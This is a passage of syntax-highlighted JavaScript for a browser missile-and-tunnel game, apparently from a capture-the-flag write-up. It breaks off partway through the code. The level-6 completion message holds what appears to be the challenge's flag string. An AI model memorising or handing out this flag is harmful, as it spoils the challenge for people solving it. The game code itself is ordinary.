class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">MG</span>.<span class=\"property\">game</span> = (<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** Constants **/</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"title class_\">GameState</span> = &#123;</span><br><span class=\"line\">        <span class=\"attr\">WAIT_START</span>: <span class=\"string\">&#x27;wait_start&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">STARTING</span>:   <span class=\"string\">&#x27;starting&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">RUNNING</span>:    <span class=\"string\">&#x27;running&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">FINISHED</span>:   <span class=\"string\">&#x27;finished&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">CRASHED</span>:    <span class=\"string\">&#x27;crashed&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable constant_\">STARTING_LIVES</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span> = <span class=\"number\">20</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** Variables **/</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">WAIT_START</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> mLives = <span class=\"variable constant_\">STARTING_LIVES</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> mLevel = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> mRemainingBarriers = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> mBarriersToPass = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> mProgress = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> mBestProgress = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Strings for UI ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> getLevelString = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mLevel ? <span class=\"string\">&#x27;LEVEL &#x27;</span> + mLevel : <span class=\"string\">&#x27;QUALIFYING LEVEL&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"title class_\">Messages</span> = &#123;</span><br><span class=\"line\">        <span class=\"attr\">START</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">title</span>: getLevelString,</span><br><span class=\"line\">            <span class=\"attr\">text</span>:  <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CLICK TO BEGIN&#x27;</span>;&#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">CRASH</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">title</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CRASHED&#x27;</span>;&#125;,</span><br><span class=\"line\">            <span class=\"attr\">text</span>:  <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CLICK TO RETRY&#x27;</span>;&#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">GAME_OVER</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">title</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;GAME OVER&#x27;</span>;&#125;,</span><br><span class=\"line\">            <span class=\"attr\">text</span>:  <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CLICK TO START AGAIN&#x27;</span>;&#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">FINISH</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">title</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;LEVEL COMPLETED&#x27;</span>;&#125;,</span><br><span class=\"line\">            <span class=\"attr\">text</span>:  <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;<span class=\"keyword\">if</span> (mLevel === <span class=\"number\">6</span>) &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;GOT F|L|A|G &#123;y0u_w1n_th1s_!!!&#125;&#x27;</span>;&#125; <span class=\"keyword\">else</span> &#123;<span class=\"keyword\">return</span> <span class=\"string\">&#x27;CLICK TO CONTINUE&#x27;</span>;&#125;&#125;,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> getLevelStartVelocity   = <span class=\"keyword\">function</span> (<span class=\"params\">level</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">300</span> + <span class=\"number\">100</span>*level;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> getLevelFinishVelocity  = <span class=\"keyword\">function</span> (<span class=\"params\">level</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">400</span> + <span class=\"number\">100</span>*level;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> getPreLevelIdleVelocity = <span class=\"keyword\">function</span> (<span class=\"params\">level</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">350</span> + <span class=\"number\">100</span>*level;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> getPostLevelIdleVelocity = <span class=\"keyword\">function</span> (<span class=\"params\">level</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">550</span> + <span class=\"number\">100</span>*level;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> playCrashAnimation = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO move drawing out of the update loop</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// create a copy of the explosion element</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> explosion = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;explosion&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// play the animation</span></span><br><span class=\"line\">        explosion.<span class=\"property\">firstChild</span>.<span class=\"title function_\">beginElement</span>();</span><br><span class=\"line\">        explosion.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">&#x27;visibility&#x27;</span>, <span class=\"string\">&#x27;visible&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// TODO can&#x27;t seem to get a callback to fire when the animation</span></span><br><span class=\"line\">        <span class=\"comment\">// finishes. Use timeout instead</span></span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> explosion = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;explosion&#x27;</span>);</span><br><span class=\"line\">            explosion.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">&#x27;visibility&#x27;</span>, <span class=\"string\">&#x27;hidden&#x27;</span>);</span><br><span class=\"line\">        &#125;, <span class=\"number\">400</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> goWaitStartLevel = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">show</span>(<span class=\"title class_\">Messages</span>.<span class=\"property\">START</span>.<span class=\"title function_\">title</span>(), <span class=\"title class_\">Messages</span>.<span class=\"property\">START</span>.<span class=\"title function_\">text</span>());</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">util</span>.<span class=\"title function_\">showMouse</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setAutopilot</span>();</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setVelocity</span>(<span class=\"title function_\">getPreLevelIdleVelocity</span>(mLevel));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mLevel === <span class=\"number\">0</span>) &#123;mLives = <span class=\"title class_\">Infinity</span>;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">WAIT_START</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> goRun = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">hide</span>();</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">util</span>.<span class=\"title function_\">hideMouse</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* TODO should the start barrier be pushed here?</span></span><br><span class=\"line\"><span class=\"comment\">        If so, should all of the barriers for the entire level be pushed as well? */</span></span><br><span class=\"line\">        mRemainingBarriers = <span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span>;</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">pushBarrier</span>(<span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">START</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        mBarriersToPass = <span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setManual</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">STARTING</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> goFinish = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">show</span>(<span class=\"title class_\">Messages</span>.<span class=\"property\">FINISH</span>.<span class=\"title function_\">title</span>(), <span class=\"title class_\">Messages</span>.<span class=\"property\">FINISH</span>.<span class=\"title function_\">text</span>());</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">util</span>.<span class=\"title function_\">showMouse</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setAutopilot</span>();</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setVelocity</span>(<span class=\"title function_\">getPostLevelIdleVelocity</span>(mLevel));</span><br><span class=\"line\"></span><br><span class=\"line\">        mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">FINISHED</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> goCrash = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable constant_\">MG</span>.<span class=\"property\">util</span>.<span class=\"title function_\">showMouse</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mLives === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">show</span>(<span class=\"title class_\">Messages</span>.<span class=\"property\">GAME_OVER</span>.<span class=\"title function_\">title</span>(), <span class=\"title class_\">Messages</span>.<span class=\"property\">GAME_OVER</span>.<span class=\"title function_\">text</span>());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">banner</span>.<span class=\"title function_\">show</span>(<span class=\"title class_\">Messages</span>.<span class=\"property\">CRASH</span>.<span class=\"title function_\">title</span>(), <span class=\"title class_\">Messages</span>.<span class=\"property\">CRASH</span>.<span class=\"title function_\">text</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_\">playCrashAnimation</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">        mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">CRASHED</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//==========================================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"attr\">init</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> rootNode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;tunnel&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">init</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">var</span> wallNode;</span><br><span class=\"line\"></span><br><span class=\"line\">            wallNode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElementNS</span>(<span class=\"variable constant_\">NAMESPACE_SVG</span>, <span class=\"string\">&#x27;g&#x27;</span>);</span><br><span class=\"line\">            wallNode.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;scale(1,-1)&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">tunnelWall</span>.<span class=\"title function_\">init</span>(wallNode);</span><br><span class=\"line\"></span><br><span class=\"line\">            rootNode.<span class=\"title function_\">appendChild</span>(wallNode);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">var</span> barrierQueueNode;</span><br><span class=\"line\"></span><br><span class=\"line\">            barrierQueueNode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElementNS</span>(<span class=\"variable constant_\">NAMESPACE_SVG</span>, <span class=\"string\">&#x27;g&#x27;</span>);</span><br><span class=\"line\">            barrierQueueNode.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;scale(1,-1)&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">init</span>(barrierQueueNode);</span><br><span class=\"line\"></span><br><span class=\"line\">            rootNode.<span class=\"title function_\">appendChild</span>(barrierQueueNode);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_\">goWaitStartLevel</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            rootNode.<span class=\"title function_\">setAttribute</span>(<span class=\"string\">&#x27;visibility&#x27;</span>, <span class=\"string\">&#x27;visible&#x27;</span>);</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attr\">update</span>: <span class=\"keyword\">function</span> (<span class=\"params\">dt</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">update</span>(dt);    </span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">tunnelWall</span>.<span class=\"title function_\">update</span>(dt);</span><br><span class=\"line\">            <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">update</span>(dt);    </span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">/* check whether the nearest barrier has been reached and whether the missile collides with it. */</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">isEmpty</span>()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getOffset</span>() &lt; <span class=\"variable constant_\">MG</span>.<span class=\"property\">MISSILE_LENGTH</span> &amp;&amp; !<span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">isCrashed</span>())&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> barrier = <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">nextBarrier</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (barrier.<span class=\"title function_\">collides</span>(<span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getPosition</span>().<span class=\"property\">x</span>, <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getPosition</span>().<span class=\"property\">y</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// CRASH</span></span><br><span class=\"line\">                        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">onCrash</span>();</span><br><span class=\"line\">                        <span class=\"title function_\">goCrash</span>();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">// BARRIER PASSED</span></span><br><span class=\"line\">                        <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">popBarrier</span>();</span><br><span class=\"line\">                        <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">onBarrierPassed</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"comment\">// TODO this block makes loads of assumptions about state</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (mState === <span class=\"title class_\">GameState</span>.<span class=\"property\">RUNNING</span></span><br><span class=\"line\">                         || mState === <span class=\"title class_\">GameState</span>.<span class=\"property\">STARTING</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">switch</span>(barrier.<span class=\"title function_\">getType</span>()) &#123;</span><br><span class=\"line\">                              <span class=\"keyword\">case</span> <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">FINISH</span>:</span><br><span class=\"line\">                                <span class=\"title function_\">goFinish</span>();</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                              <span class=\"keyword\">case</span> <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">BLANK</span>:</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                              <span class=\"keyword\">case</span> <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">START</span>:</span><br><span class=\"line\">                                mState = <span class=\"title class_\">GameState</span>.<span class=\"property\">RUNNING</span>;</span><br><span class=\"line\">                                <span class=\"comment\">// FALLTHROUGH</span></span><br><span class=\"line\">                              <span class=\"attr\">default</span>:</span><br><span class=\"line\">                                mBarriersToPass--;</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"keyword\">var</span> startVelocity = <span class=\"title function_\">getLevelStartVelocity</span>(mLevel);</span><br><span class=\"line\">                                <span class=\"keyword\">var</span> finishVelocity = <span class=\"title function_\">getLevelFinishVelocity</span>(mLevel);</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">setVelocity</span>(startVelocity</span><br><span class=\"line\">                                                         + (startVelocity - finishVelocity)</span><br><span class=\"line\">                                                           * (mBarriersToPass - <span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span>)</span><br><span class=\"line\">                                                             / <span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span>);</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;    </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">/* Pad the barrier queue with blank barriers so that there are barriers</span></span><br><span class=\"line\"><span class=\"comment\">            as far as can be seen. */</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (<span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">numBarriers</span>() &lt; <span class=\"variable constant_\">MG</span>.<span class=\"property\">LINE_OF_SIGHT</span>/<span class=\"variable constant_\">MG</span>.<span class=\"property\">BARRIER_SPACING</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> type = <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">BLANK</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"keyword\">if</span> (mState === <span class=\"title class_\">GameState</span>.<span class=\"property\">RUNNING</span></span><br><span class=\"line\">                 || mState === <span class=\"title class_\">GameState</span>.<span class=\"property\">STARTING</span>) &#123;</span><br><span class=\"line\">                    mRemainingBarriers--;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (mRemainingBarriers &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        type = <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">RANDOM</span>;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (mRemainingBarriers === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        type = <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">FINISH</span>;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        type = <span class=\"variable constant_\">MG</span>.<span class=\"property\">BarrierType</span>.<span class=\"property\">BLANK</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"variable constant_\">MG</span>.<span class=\"property\">barrierQueue</span>.<span class=\"title function_\">pushBarrier</span>(type);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">/* Update progress */</span></span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (mState) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">RUNNING</span>:</span><br><span class=\"line\">                mProgress = <span class=\"number\">1</span> - (mBarriersToPass*<span class=\"variable constant_\">MG</span>.<span class=\"property\">BARRIER_SPACING</span> + <span class=\"variable constant_\">MG</span>.<span class=\"property\">missile</span>.<span class=\"title function_\">getOffset</span>())/(<span class=\"variable constant_\">LEVEL_NUM_BARRIERS</span> * <span class=\"variable constant_\">MG</span>.<span class=\"property\">BARRIER_SPACING</span>);</span><br><span class=\"line\">                mBestProgress = <span class=\"title class_\">Math</span>.<span class=\"title function_\">max</span>(mProgress, mBestProgress);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">              <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">FINISHED</span>:</span><br><span class=\"line\">                mProgress = <span class=\"number\">1</span>;</span><br><span class=\"line\">                mBestProgress = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">              <span class=\"keyword\">case</span> <span class=\"title class_\">GameState</span>.<span class=\"property\">STARTING</span>:</span><br><span class=\"line\">                mProgress = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">              <span class=\"attr\">default</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"attr\">updateDOM</span>: <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span 